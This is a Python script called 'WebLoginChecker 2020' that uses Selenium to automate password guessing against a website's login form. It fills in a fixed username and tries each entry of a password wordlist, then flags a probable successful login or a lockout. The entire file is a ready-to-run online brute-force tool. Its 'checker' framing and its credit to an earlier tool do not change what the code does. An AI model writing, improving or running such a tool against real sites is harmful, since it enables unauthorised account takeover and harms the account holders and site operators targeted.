# WebLoginChecker 2020
# by @lxndroc-@aoctut
# Inspiration credit: Hatch by @metachar
from requests import get
from selenium.common.exceptions import NoSuchElementException
from selenium import webdriver
from time import sleep

def check_website(website):
    STATUS_OK = 200
    try:
        request = get(website)
        if request.status_code == STATUS_OK:
            print(f'\n[v] Website {website} is accessible!')
            return True
    except:
        print('\n[x] Website is not accessible!')
    return False

def check_pass(website, username_selector, password_selector, login_button_selector, username, pass_list):
    # update this with the path and filename of the Selenium Chrome driver, e.g. D:/utils/net/chromedriver
    DRIVER_PATH = 'chromedriver'

    if not website:
        website = input('\n[~] Website to check: ')
    if not username_selector:
        username_selector = input('[~] Username selector: ')
    if not password_selector:
        password_selector = input('[~] Password selector: ')
    if not login_button_selector:
        login_button_selector = input('[~] Login button selector: ')
    if not username:
        username = input('[~] Username: ')
    if not pass_list:
        pass_list = input('[~] Path & file of password list: ')
    if not check_website(website):
        return

    pass_file = open(pass_list)
    try_count = 1
    browser = webdriver.Chrome(DRIVER_PATH)
    browser.get(website)
    try:
        user_entry = browser.find_element_by_css_selector(username_selector)
        for password in pass_file:
            if try_count > 1:
                print('[x] Login unsuccessful!')
            pass_entry = browser.find_element_by_css_selector(password_selector)
            login_button = browser.find_element_by_css_selector(login_button_selector)
            sleep(1)
            if try_count == 1:
                user_entry.send_keys(username)
            pass_entry.send_keys(password.strip())
            login_button.click()
            print(42 * '-')
            print(f'[!] {try_count}. User: {username}\n       Password: {password.strip()}')
            try_count += 1
        user_entry = browser.find_element_by_css_selector(username_selector)        
        if try_count > 1:
            print('[x] Login unsuccessful!\n' + 42 * '-' + '\n[!] Exiting')
        else:
            print('[x] Empty password list!\n' + 42 * '-' + '\n[!] Exiting')
    except KeyboardInterrupt:
        print('[x] Keyboard interruption!\n' + 42 * '-' + '\n[!] Exiting')
    except NoSuchElementException:
        if try_count > 1:
            print('[!] The login web page was updated!')
            print('[v] Login successful if you see your profile page!')
            print('[x] Attempts were limited if you see an attempt limitation page!\n' + 42 * '-' + '\n[!] Exiting in 1 min')
            sleep(60)
        else:
            print('[x] Username, password, or login button selector not found!\n' + 42 * '-' + '\n[!] Exiting')

def main():
    BANNER = '\n\tWebLoginChecker 2020 - by @lxndroc-@aoctut\n\t' + 42 * '-'
    # update this with the url to be checked, e.g. https://website.com
    WEBSITE = ''
    # update this with the username field CSS selector, e.g. #user_login
    USERNAME_SELECTOR = ''
    # update this with the password field CSS selector, e.g. #user_pass
    PASSWORD_SELECTOR = ''
    # update this with the login button CSS selector, e.g. #wp-submit
    LOGIN_BUTTON_SELECTOR = ''
    # update this with the username to be checked, e.g. test
    USERNAME = ''
    PASS_LIST = 'password_list.txt'

    print(BANNER)
    check_pass(WEBSITE, USERNAME_SELECTOR, PASSWORD_SELECTOR, LOGIN_BUTTON_SELECTOR, USERNAME, PASS_LIST)

main()
